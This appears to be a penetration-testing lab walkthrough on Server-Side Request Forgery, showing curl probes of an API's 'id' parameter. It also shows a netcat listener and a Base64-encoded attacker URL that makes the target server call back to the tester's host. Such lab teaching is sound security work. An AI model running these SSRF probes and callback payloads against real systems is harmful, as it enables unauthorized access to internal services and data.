Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:

-   Interacting with known internal systems
-   Discovering internal services via port scans
-   Disclosing local/sensitive data
-   Including files in the target application
-   Leaking NetNTLM hashes using UNC Paths (Windows)
-   Achieving remote code execution

As we have mentioned multiple times, though, we should fuzz every identified parameter, even if it does not seem tasked with fetching remote resources. Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api/userinfo`.

```sh
$ curl http://<TARGET IP>:3000/api/userinfo
{"success":false,"error":"'id' parameter is not given."}
```

* The API is expecting a parameter called _id_
* Since we are interested in identifying SSRF vulnerabilities in this section, let us set up a Netcat listener first

```sh
$ nc -nlvp 4444
listening on [any] 4444 ...
```

```sh
$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
{"success":false,"error":"'id' parameter is invalid."}
```

* We notice an error about the _id_ parameter being invalid, and we also notice no connection being made to our listener
* In many cases, APIs expect parameter values in a specific format/encoding
* Try Base64-encoding

```sh
$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

```sh
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.24.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close
```

**Note** As time allows, try to provide APIs with input in various formats/encodings